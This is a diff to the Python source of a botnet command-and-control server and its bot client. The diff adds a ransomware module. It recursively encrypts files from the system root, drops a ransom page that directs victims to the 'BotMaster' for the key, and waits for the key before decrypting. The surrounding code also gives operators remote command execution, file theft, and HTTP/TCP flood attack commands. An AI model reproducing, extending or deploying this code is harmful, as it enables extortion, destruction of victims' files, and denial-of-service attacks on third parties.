@@ -1,4 +1,4 @@
-import socket, threading, hashlib, os, datetime, time, sqlite3
+import socket, threading, hashlib, os, datetime, time, sqlite3, shutil
 
 class BotNet:
     """Main Class for the BotNet. Every single line of server code, payload code is inside of this class.
@@ -36,10 +36,10 @@ class BotNet:
                                || || ||
   _________            .__    .||_||_||__          __  ________         ________     _______   
  /   _____/ ________ __|__| __|||/\      \   _____/  |_\_____  \  ___  _\_____  \    \   _  \  
- \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ //  ____/    /  /_\  \ 
- /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   //       \    \  \_/   \\
-/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ \_______ \ /\ \_____  /
-        \/    |__|             \/ || ||  \/     \/             \/               \/ \/       \/ 
+ \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/  \  \/ / _(__  <    /  /_\  \ 
+ /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \   \   / /       \   \  \_/   \\
+/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \   \_/ /______  / /\ \_____  /
+        \/    |__|             \/ || ||  \/     \/             \/              \/  \/       \/ 
                                || || ||
                                || || ||
                                || || ||
@@ -55,7 +55,7 @@ class BotNet:
 Advanced Botnet By DrSquid
         """
         return logo
-    def __init__(self, ip, port, external_ip=None, external_port=None, admin_user="admin", admin_pass="adminpassword12345", logfile="log.txt", enc_key=b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=', ftp_dir="Bot_Files"):
+    def __init__(self, ip, port, external_ip=None, external_port=None, admin_user="admin", admin_pass="adminpassword12345", logfile="log.txt", enc_key=b'iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=', ftp_dir="Bot_Files", ransomware_active=True):
         """Initiation of the class. Most of every important variable is mentioned here. This function is very important, 
         as it has the definitions of all of the important variables needed for functionality, and also for specification 
         of different things. Many things are defined here, such as the socket that will be used to handle all of the connections, 
@@ -69,6 +69,7 @@ Advanced Botnet By DrSquid
         self.enc_key = enc_key
         self.botdownload = None
         self.ftp_dir = ftp_dir
+        self.ransomware_active = ransomware_active
         self.external_ip = external_ip
         self.external_port = external_port
         self.admin_online = False
@@ -90,6 +91,10 @@ Advanced Botnet By DrSquid
             self.external_ip = self.ip
         if self.external_port is None:
             self.external_port = self.port
+        if self.ransomware_active:
+            self.quot = ""
+        else:
+            self.quot = "'''"
         self.payload = self.gen_payload()
         self.payloadfile = open("SquidBot.py","w")
         self.payloadfile.write(self.payload)
@@ -109,6 +114,8 @@ Advanced Botnet By DrSquid
         self.admin_username = admin_user
         self.admin_password = hashlib.sha256(admin_pass.encode()).hexdigest()
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        shutil.copyfile(os.path.join(os.getcwd(),self.payloadfile.name), os.path.join(os.getcwd(),self.ftp_dir,self.payloadfile.name))
+        self.log(f"[({datetime.datetime.today()})][(SERVER)]: Payload file has been transferred to the FTP directory(for extraction of Admin).")
     def exec_sql_cmd(self, file, cmd):
         """Optimization code made for executing commands on db files. The reason it was made was for optimization
         purposes. This excerpt of code would be pretty much all over the place in this script if it weren't a
@@ -175,14 +182,15 @@ Advanced Botnet By DrSquid
 [+] !encfile <filename>                      - Encrypt a file inside of the bots.
 [+] !decrypt <filename>                      - Decrypt a file that has been encrypted.
 [+] !open <filename>                         - Open a file inside of the bots working directory.
+[+] !viewfilecontent <file>                  - View the contents of a file in the bots directory.
 [+] !writefile <filename>                    - Open and write inside of a file inside of the bots.
 [+] !sqlconnect <sqlfile>                    - Connect to a Sqlite3 Compatable Database file in the bots.
 [+] !changedir <dir>                         - Changes the bots working directory to the one specified(use '%user%' as the user for multiple bots).
 [+] !stopsql                                 - Disconnect from the connected Database file.
 [+] !stopwrite                               - Close writing mode and return to normal.
 [+] !getcwd                                  - Get the current directory of the bots.
-[+] !viewfilecontent                         - View the contents of a file in the bots directory.
 [+] !listdir                                 - List all of the items in the bots working directory.
+[+] !ransomware                              - Activates the ransomware program inside of the bots.
 [+] DDoS Attack Commands:
 [+] !httpflood <website> <delay>             - Make the bots conduct an HTTP Flood Attack on the specified Website.
 [+] !tcpflood <ip> <port> <delay> <pkt_size> - Make the bots concuct a TCP Flood Attack on the specified IP and Port.
@@ -580,6 +588,15 @@ Advanced Botnet By DrSquid
                                                 self.send_to_other("SERVER",self.admin_username,"You are in focus mode! Only the bot you are focusing will stop attacking!",self.adminconn)
                                         elif not self.ddosing:
                                             self.send_to_other("SERVER",self.admin_username,"The Bots are currently not attacking any domain.",self.adminconn)
+                                    elif msg.startswith("!ransomware"):
+                                        if self.ransomware_active:
+                                            if self.focusing:
+                                                self.send_to_other("SERVER",name,"Only the bot in focus mode has had the ransomware program activated!", conn)
+                                            else:
+                                                self.send_to_other("SERVER",name,"Ransomware programs are activating!", conn)
+                                                self.send_to_other("SERVER",name,"Payloads are effective!", conn)
+                                        else:
+                                            self.send_to_other("SERVER",name,"The ransomware has been disabled in the config file. Turn the value assigned to 'ransomware_active' to 't'")
                                     elif msg.startswith("!download"):
                                         try:
                                             filename = msg.split()[1]
@@ -4033,6 +4050,128 @@ class TCP_UDP_Flood:
                 time.sleep(self.delay)
             except:
                 pass
+class RansomWare:
+    def __init__(self, key):
+        self.key = key
+        self.fernet = Fernet(self.key)
+        self.dirlist = []
+        self.filelist = []
+        self.keyfile = "key.txt"
+        self.recovery_directory = ""
+        if sys.platform == "win32":
+            os.chdir("C:/")
+            self.recovery_directory = f"C:/Users/{os.getlogin()}/"
+        else:
+            self.recovery_directory = "/"
+            os.chdir("/")
+    def get_dir_list(self):
+        for i in os.listdir():
+            try:
+                file = open(i, "rb")
+                file.close()
+                self.filelist.append(os.path.join(os.getcwd(),i))
+            except:
+                self.dirlist.append(os.path.join(os.getcwd(), i))
+    def encrypt_file(self, file):
+        try:
+            with open(file, "rb") as og_file:
+                content = self.fernet.encrypt(og_file.read())
+                og_file.close()
+            with open(file, "wb") as enc_file:
+                enc_file.write(content)
+                enc_file.close()
+        except:
+            pass
+    def encrypt(self):
+        self.get_dir_list()
+        for i in self.dirlist:
+            try:
+                os.chdir(i)
+                self.get_dir_list()
+            except:
+                pass
+        for i in self.filelist:
+            file_thread = threading.Thread(target=self.encrypt_file, args=(i,))
+            file_thread.start()
+        self.ransom()
+        self.checker = threading.Thread(target=self.check_key_file)
+        self.checker.start()
+    def decrypt(self):
+        for i in self.filelist:
+            try:
+                with open(i,"rb") as enc_file:
+                    content = self.fernet.decrypt(enc_file.read())
+                    enc_file.close()
+                with open(i,"wb") as new_file:
+                    new_file.write(content)
+                    new_file.close()
+            except:
+                pass
+    def download_emotional_support(self):
+        cmd = subprocess.Popen(f"cd {self.recovery_directory}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        _cmd = subprocess.Popen(f"curl -o barbara.png https://i.redd.it/w2eduogz9ir51.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    def recovering_html_code(self):
+        return f'''
+<!DOCTYPE html>
+<head></head>
+<title>You're in Luck | Your files are being decrypted!</title>
+<body bgcolor='red'>
+<h1>Lucky you!</h1>
+<h2>You have successfully put the correct encryption key into the text file({self.keyfile}).</h2>
+<h2>Please wait a moment, as the decrypted files are being decrypted at this moment.
+<h4>You can say your goodbyes to Barbara!</h4>
+<img src="barbara.png" alt="Where is the image?" width="300" height="500">
+</body>
+        '''
+    def ransom_html_code(self):
+        return f'''
+<!DOCTYPE html>
+<head></head>
+<body bgcolor='red'>
+<title>Oops! | You've been Compromised!</title>
+<h1>Oops!</h1>
+<h2>Looks like your files have been encrypted.</h2>
+<h3>There is hope.</h3><br>
+A file has been created in this directory: {self.recovery_directory}{self.keyfile}<br>
+Simply place the encryption key of your files in the file(and this file only), and you will have your files back!<br>
+How you will get your key? Well, that's all up to the BotMaster.
+<h2>Heres a picture of Barbara! Perhaps she will give you emotional Support....</h2><br>
+<img src="barbara.png" alt="Where is the image?" width="300" height="500">
+</body>
+        '''
+    def check_key_file(self):
+        while True:
+            try:
+                file = open(f"{self.recovery_directory}{self.keyfile}","rb")
+                content = file.read()
+                if bytes(content.strip()) == self.key:
+                    self.decryptor = threading.Thread(target=self.decrypt)
+                    self.decryptor.start()
+                    self.ransom(True)
+                    break
+                time.sleep(1)
+            except:
+                pass
+    def ransom(self, recovering=False):
+        os.chdir(self.recovery_directory)
+        if not recovering:
+            keyfile = open(self.keyfile,"w")
+            keyfile.close()
+            self.download_emotional_support()
+            filename = "Oops.html"
+        else:
+            filename = "Yay.html"
+            bot.make_selffiles_encrypted_false()
+        file = open(f"{self.recovery_directory}{filename}","w")
+        if recovering:
+            file.write(self.recovering_html_code())
+        else:
+            file.write(self.ransom_html_code())
+        file.close()
+        if sys.platform == "win32":
+            os.startfile(file.name)
+        else:
+            os.system(f"open {file.name}")
 class Bot:
     def __init__(self, ip, port, enc_key):
         self.ip = ip
@@ -4040,6 +4179,7 @@ class Bot:
         self.sendingfile = False
         self.enc_key = enc_key
         self.can_encrypt = False
+        self.files_encrypted = False
         self.sql_connected = False
         try:
             self.fernet = Fernet(self.enc_key)
@@ -4064,6 +4204,7 @@ class Bot:
                 self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.client.connect((self.ip, self.port))
                 banner = self.client.recv(1024).decode()
+                time.sleep(5)
                 break
             except:
                 self.client.close()
@@ -4078,6 +4219,9 @@ class Bot:
         for i in msg:
             filename += f" {i}"
         return filename.strip()
+    def make_selffiles_encrypted_false(self):
+        self.files_encrypted = False
+        print(self.files_encrypted)
     def recv(self):
         while True:
             try:
@@ -4198,6 +4342,11 @@ class Bot:
                 elif msg.startswith("!mkdir"):
                     dir = self.get_filename(msg)
                     os.mkdir(dir)
+                elif msg.startswith("!ransomware"):
+                    if not self.files_encrypted:
+                        self.ransomware = RansomWare(self.enc_key)
+                        self.ransomware.encrypt()
+                        self.files_encrypted = True
                 elif msg.startswith("!createfile"):
                     file = self.get_filename(msg)
                     if file in os.listdir():
@@ -4263,7 +4412,9 @@ class Bot:
                         time.sleep(1)
                         self.client.send("File transfer to server completed.".encode())
                     except:
-                        self.client.send("!fileerror".encode())
+                        self.client.send("File was not found in the bot directory.".encode())
+                        time.sleep(3)
+                        self.client.send("!stopsave".encode())
                 elif msg.startswith("!download"):
                     try:
                         link = msg.split()[1]
@@ -4277,7 +4428,7 @@ class Bot:
                     self.client.send(cmd.stdout.read())
                     self.client.send(cmd.stderr.read())
             except Exception as e:
-                print(e)
+                pass
         elif self.writing_mode:
             write_msg = f"\\n{msg}".encode()
             if msg == "!stopwrite":
@@ -4328,10 +4479,16 @@ class Config:
                 elif i.startswith("\nadmin_password") or i.startswith("admin_password"):
                     admin_password = i.replace("=","").split()[1]
                 elif i.startswith("\nenc_key") or i.startswith("enc_key"):
-                    enc_key = i.replace("=","").split()[1].encode()
+                    enc_key = f"{i.replace('=','').split()[1]}=".encode()
                 elif i.startswith("\nftp_dir") or i.startswith("ftp_dir"):
                     ftp_dir = i.replace("=","").split()[1]
-            Squidnet = BotNet(hostip, hostport, external_host, external_port, admin_name, admin_password, logfile, enc_key, ftp_dir)
+                elif i.startswith("\nransomware_active") or i.startswith("ransomware_active"):
+                    ransomware_active = i.replace("=","").split()[1]
+                    if ransomware_active.lower() == "f":
+                        ransomware_active = False
+                    else:
+                        ransomware_active = True
+            Squidnet = BotNet(hostip, hostport, external_host, external_port, admin_name, admin_password, logfile, enc_key, ftp_dir, ransomware_active)
             Squidnet.start()
         except Exception as e:
             self.gen_config_file()
@@ -4349,7 +4506,9 @@ logfile = log.txt
 admin_name = admin
 admin_password = adminpassword12345
 enc_key = iC0g4NM4xy5JrIbRV-8cZSVgFfQioUX8eTVGYRhWlF8=
-ftp_dir = Bot_Files"""
+ftp_dir = Bot_Files
+ransomware_active = f
+"""
         file = open(self.config_file,"w")
         file.write(gen_content)
         file.close()
